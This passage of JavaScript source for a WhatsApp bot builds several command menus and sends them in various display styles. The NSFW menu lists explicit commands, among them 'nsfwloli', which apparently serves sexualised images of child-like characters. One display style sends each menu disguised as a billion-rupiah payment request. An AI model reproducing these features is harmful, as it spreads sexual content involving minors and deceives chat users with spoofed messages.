                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'cucimata': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *C U C I  M A T A - M E N U*
${simboltengah}
${global.tTeks}art *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}awoo *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}bite *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}blush *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}bonk *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}bts *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecan *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecanchina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecanhijaber *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecanindo *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecanjepan *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecankorea *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecanmalaysia *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecanvietnam *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cogan *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cringe *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}dance *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}elf *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}estetic *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}glomp *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}handhold *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}happy *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}highfive *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}husbu *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kanna *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}killimg *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}lick *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}nom *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}pat *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}poke *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}slap *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}smile *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}smug *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}wave *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}wink *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}yeet *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'nsfwmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *N S F W - M E N U*
${simboltengah}
${global.tTeks}nsfw *on / off*
${global.tTeks}nsfwvid *free only*
${global.tTeks}armpits *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hentai *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}gifhentai *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}gifblowjob *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hentaivid *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hentaivid2 *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hneko *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}nwaifu *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}animespank *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}trap *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}gasm *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ahegao *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ass *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}bdsm *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}blowjob *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cuckold *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cum *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cum_jpg *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}milf *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}eba *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ero *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ecchi *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}femdom *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}foot *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}feets *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}gangbang *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}glasses *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}jahy *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}lewd *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}lewdk *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}masturbation *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}manga *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}neko-hentai *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}neko-hentai2 *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}nsfwloli *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}rule34 *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}orgy *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}onlyfans *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}panties *ғʀᴇᴇ ᴏɴʟʏ* 
${global.tTeks}pussy *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}tentacles *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}tits *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}thights *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}yuri *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}zettai *ғʀᴇᴇ ᴏɴʟʏ*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'getmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *G E T - M E N U*
${simboltengah}
${global.tTeks}gethyuv7
${global.tTeks}getcv8
${global.tTeks}gethw22
${global.tTeks}getsesi
${global.tTeks}getcv7
${global.tTeks}getsccampuran
${global.tTeks}gethw20
${global.tTeks}getegg
${global.tTeks}getpm2
${global.tTeks}getscpush
${global.tTeks}getbio
${global.tTeks}getname
${global.tTeks}getpic
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'beritamenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *B E R I T A - M E N U*
${simboltengah}
${global.tTeks}antara *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cnbc *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cnn *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}daily *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}detik *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}fajar *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}indozone *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}inews *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}jalantikus-meme *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}kompas *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}kontan *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}layarkaca *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}merdeka *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}okezone *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}sindo *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}tempo *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}tribun *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}wikipedia *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}wikimedia *ғʀᴇᴇ ᴏɴʟʏ*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'islammenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *I S L A M - M E N U*
${simboltengah}
${global.tTeks}alquran
${global.tTeks}alquranaudio
${global.tTeks}asmaulhusna
${global.tTeks}bacaanshalat
${global.tTeks}hadist
${global.tTeks}jadwalsholat
${global.tTeks}kisahnabi
${global.tTeks}listsurah
${global.tTeks}niatshalat
${global.tTeks}tafsirsurah
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
